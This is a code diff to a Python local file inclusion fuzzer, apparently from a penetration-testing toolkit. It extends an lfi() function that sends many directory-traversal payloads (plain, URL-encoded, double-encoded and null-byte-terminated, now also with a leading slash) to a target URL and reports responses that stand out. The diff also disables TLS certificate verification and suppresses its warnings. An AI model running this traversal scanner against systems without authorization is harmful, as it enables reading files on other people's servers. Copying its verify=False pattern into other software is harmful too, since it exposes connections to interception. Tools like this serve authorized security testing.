@@ -3,9 +3,11 @@ import requests
 import getopt
 import sys
 import common
+import urllib3
 
 from urllib.parse import quote_plus
 
+urllib3.disable_warnings()
 
 
 DDS = "../"
@@ -52,28 +54,46 @@ def lfi(url, payload, hcode=(), hsize=(), cookie=None, depth=5):
                     f"{payload}/{dds}{ds}",
                     f"{payload}/{ds}{dds}"]
         for p in payloads:
-            resp = requests.get(f"{url}{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)
+            resp = requests.get(f"{url}{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
             if resp.status_code not in hcode and len(resp.content) not in hsize:
                 print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))                
-            resp = requests.get(f"{url}{p}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)
+            resp = requests.get(f"{url}{p}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
             if resp.status_code not in hcode and len(resp.content) not in hsize:
                 print(common.good_code(resp.status_code, f"{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+            resp = requests.get(f"{url}/{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize:
+                print(common.good_code(resp.status_code, f"/{p} [code:{resp.status_code} size:{len(resp.content)}]"))                
+            resp = requests.get(f"{url}/{p}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize:
+                print(common.good_code(resp.status_code, f"/{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                 
             # URLENCODE
-            resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)            
+            resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)            
             if resp.status_code not in hcode and len(resp.content) not in hsize:
             	print(common.good_code(resp.status_code, f"{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
-            resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)
+            resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
             if resp.status_code not in hcode and len(resp.content) not in hsize:
             	print(common.good_code(resp.status_code, f"{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+            resp = requests.get(f"{url}/{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)            
+            if resp.status_code not in hcode and len(resp.content) not in hsize:
+            	print(common.good_code(resp.status_code, f"/{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
+            resp = requests.get(f"{url}/{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize:
+            	print(common.good_code(resp.status_code, f"/{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
             	
             # DOUBLE URLENCODE
-            resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)
+            resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
             if resp.status_code not in hcode and len(resp.content) not in hsize:
             	print(common.good_code(resp.status_code, f"{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
-            resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)
+            resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
             if resp.status_code not in hcode and len(resp.content) not in hsize:
             	print(common.good_code(resp.status_code, f"{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+            resp = requests.get(f"{url}/{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize:
+            	print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))            	
+            resp = requests.get(f"{url}/{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
+            if resp.status_code not in hcode and len(resp.content) not in hsize:
+            	print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
         dds += DDS
         ds += DS
 
@@ -94,28 +114,46 @@ def lfi(url, payload, hcode=(), hsize=(), cookie=None, depth=5):
                             f"{dds}{ds}{payload}/{dds}",
                             f"{ds}{dds}{payload}/{dds}"]
             for p in payloads_two:                
-                resp = requests.get(f"{url}{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)
+                resp = requests.get(f"{url}{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                     print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))                    
-                resp = requests.get(f"{url}{p}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)
+                resp = requests.get(f"{url}{p}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                     print(common.good_code(resp.status_code, f"{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+                resp = requests.get(f"{url}/{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                    print(common.good_code(resp.status_code, f"/{p} [code:{resp.status_code} size:{len(resp.content)}]"))                    
+                resp = requests.get(f"{url}/{p}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                    print(common.good_code(resp.status_code, f"/{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                     
                 # URLENCODE
-                resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)
+                resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(common.good_code(resp.status_code, f"{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))                	
-                resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)
+                resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(common.good_code(resp.status_code, f"{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+                resp = requests.get(f"{url}/{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                	print(common.good_code(resp.status_code, f"/{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))                	
+                resp = requests.get(f"{url}/{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                	print(common.good_code(resp.status_code, f"/{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                 	
                 # DOUBLE URLENCODE
-                resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)
+                resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(common.good_code(resp.status_code, f"{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
-                resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)
+                resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(common.good_code(resp.status_code, f"{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+                resp = requests.get(f"{url}/{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                	print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
+                resp = requests.get(f"{url}/{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                	print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
             dds += DDS
         ds += DS
 
@@ -136,29 +174,46 @@ def lfi(url, payload, hcode=(), hsize=(), cookie=None, depth=5):
                             f"{dds}{ds}{payload}/{dds}",
                             f"{ds}{dds}{payload}/{dds}"]
             for p in payloads_two:
-                resp = requests.get(f"{url}{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)
+                resp = requests.get(f"{url}{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                     print(common.good_code(resp.status_code, f"{p} [code:{resp.status_code} size:{len(resp.content)}]"))
-                    
-                resp = requests.get(f"{url}{p}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)
+                resp = requests.get(f"{url}{p}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                     print(common.good_code(resp.status_code, f"{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+                resp = requests.get(f"{url}/{p}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                    print(common.good_code(resp.status_code, f"/{p} [code:{resp.status_code} size:{len(resp.content)}]"))
+                resp = requests.get(f"{url}/{p}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                    print(common.good_code(resp.status_code, f"/{p}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                     
                 # URLENCODE
-                resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)
+                resp = requests.get(f"{url}{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(common.good_code(resp.status_code, f"{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))                	
-                resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)
+                resp = requests.get(f"{url}{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(common.good_code(resp.status_code, f"{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+                resp = requests.get(f"{url}/{common.urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                	print(common.good_code(resp.status_code, f"/{common.urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))                	
+                resp = requests.get(f"{url}/{common.urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                	print(common.good_code(resp.status_code, f"/{common.urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
                 	
                 # DOUBLE URLENCODE
-                resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)
+                resp = requests.get(f"{url}{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(common.good_code(resp.status_code, f"{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
-                resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False)
+                resp = requests.get(f"{url}{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
                 if resp.status_code not in hcode and len(resp.content) not in hsize:
                 	print(common.good_code(resp.status_code, f"{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
+                resp = requests.get(f"{url}/{common.double_urlencode(p)}", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                	print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)} [code:{resp.status_code} size:{len(resp.content)}]"))
+                resp = requests.get(f"{url}/{common.double_urlencode(p)}%00", headers=common.USER_AGENT, cookies=cookie, allow_redirects=False, verify=False)
+                if resp.status_code not in hcode and len(resp.content) not in hsize:
+                	print(common.good_code(resp.status_code, f"/{common.double_urlencode(p)}%00 [code:{resp.status_code} size:{len(resp.content)}]"))
             ds += DS
         dds += DDS
 
